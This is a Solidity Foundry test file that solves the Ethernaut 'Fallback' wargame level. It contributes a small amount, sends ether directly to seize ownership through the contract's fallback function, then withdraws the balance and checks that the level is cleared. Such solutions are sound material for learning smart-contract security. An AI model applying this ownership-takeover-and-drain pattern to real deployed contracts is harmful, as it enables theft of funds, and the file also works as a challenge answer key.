// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "ds-test/test.sol";
import "../src/Ethernaut.sol";
import "../src/levels/Fallback/Fallback.sol";
import "../src/levels/Fallback/FallbackFactory.sol";
import {Vm} from "forge-std/Vm.sol";

contract FallbackTest is DSTest {
    Fallback public fallbackInstance;
    Vm private constant vm = Vm(HEVM_ADDRESS);
    Ethernaut ethernaut;
    FallbackFactory fallbackFactory;
    address eoa = address(69);

    function setUp() public {
        // Initializing Fallback contract.
        ethernaut = new Ethernaut();
        fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
        vm.label(0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84, "Fallback Owner");
        vm.deal(eoa, 1 ether);
    }

    function testIsFallbackCleared() public {
        vm.startPrank(eoa);
        address instance = ethernaut.createLevelInstance(fallbackFactory);
        fallbackInstance = Fallback(payable(instance));
        fallbackInstance.contribute{value: 1 wei}();
        assertEq(fallbackInstance.contributions(eoa), 1 wei);
        (bool success, ) = payable(fallbackInstance).call{value: 1 wei}("");
        assertTrue(success);
        fallbackInstance.withdraw();

        assertTrue(ethernaut.submitLevelInstance(payable(instance)));

        vm.stopPrank();
    }
}
